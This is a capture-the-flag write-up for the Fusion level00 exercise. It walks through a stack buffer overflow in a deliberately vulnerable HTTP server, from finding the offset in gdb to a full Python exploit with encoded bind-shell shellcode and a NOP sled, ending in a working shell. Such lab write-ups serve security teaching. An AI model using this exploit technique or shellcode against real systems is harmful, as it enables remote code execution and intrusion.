+++
author = "pwntester"
categories = ["CTF", "Fusion", "level00", "exploit"]
date = 2013-12-27T17:45:00Z
description = ""
draft = false
slug = "fusion-level00-write-up"
tags = ["CTF", "Fusion", "level00", "exploit"]
title = "Fusion level00 write-up"

+++

## Fusion level00
This [level](http://exploit-exercises.com/fusion/level00) has no protections at all:

![](/images/octopress/fusion00.png)

The code looks like:

```lang-clike line-numbers 
#include "../common/common.c"

int fix_path(char *path)
{
  char resolved[128];

  if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
  strcpy(path, resolved);
}

char *parse_http_request()
{
  char buffer[1024];
  char *path;
  char *q;

  // printf("[debug] buffer is at 0x%08x :-)\n", buffer); :D

  if(read(0, buffer, sizeof(buffer)) <= 0) errx(0, "Failed to read from remote host");
  if(memcmp(buffer, "GET ", 4) != 0) errx(0, "Not a GET request");

  path = &buffer[4];
  q = strchr(path, ' ');
  if(! q) errx(0, "No protocol version specified");
  *q++ = 0;
  if(strncmp(q, "HTTP/1.1", 8) != 0) errx(0, "Invalid protocol");

  fix_path(path);

  printf("trying to access %s\n", path);

  return path;
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *p;

  background_process(NAME, UID, GID);
  fd = serve_forever(PORT);
  set_io(fd);

  parse_http_request();
}
```

The goal seems to overflow the "resolved" buffer and use a return access in the "buffer" somewhere after the "HTTP/1.1" protocol.

First we need to know what is the right offset to overflow the "resolved" buffer. It should be 128, but with compilers you never know.

We will be monitoring the application with gdb in its follow fork child mode:

```lang-bash line-numbers 
fusion@fusion:~$ sudo gdb -q /opt/fusion/bin/level00
Reading symbols from /opt/fusion/bin/level00...done.
(gdb) attach 1191
Attaching to program: /opt/fusion/bin/level00, process 1191
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb7873424 in __kernel_vsyscall ()
(gdb)  set follow-fork-mode child
(gdb) c
Continuing.
```

We start with 128 As and keep trying to find the right offset that is a path of 140 bytes (Im too lazy to use msg patters :) ):

```lang-bash line-numbers 
fusion@fusion:~$ python -c 'print "GET " + "A"*139 + "DDDD" + " HTTP/1.1"' | nc localhost 20000
[debug] buffer is at 0xbfcdf1c8 :-)
```

We can see in gdb that we got the right offset:

```lang-bash line-numbers 
(gdb) attach 1399
Attaching to program: /usr/bin/id, process 1399
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb7829424 in __kernel_vsyscall ()
(gdb) c
Continuing.
[New process 1445]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1445]
0x44444444 in ?? ()
```

Now lets use the buffer address returned by the application + 160 bytes to land in our nop sled and reuse one of our shellcodes:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20000))

shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

ret = "\x68\xf2\xcd\xbf" #0xbfcdf268
payload =  "GET " + "A"*139 + ret + " HTTP/1.1 " + "\x90"*16 +  shellcode
s.send(payload)
s.close()
```

After running the exploit we can collect our shell:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion00.py
fusion@fusion:~$ nc localhost 5074
id
uid=20000 gid=20000 groups=20000
```
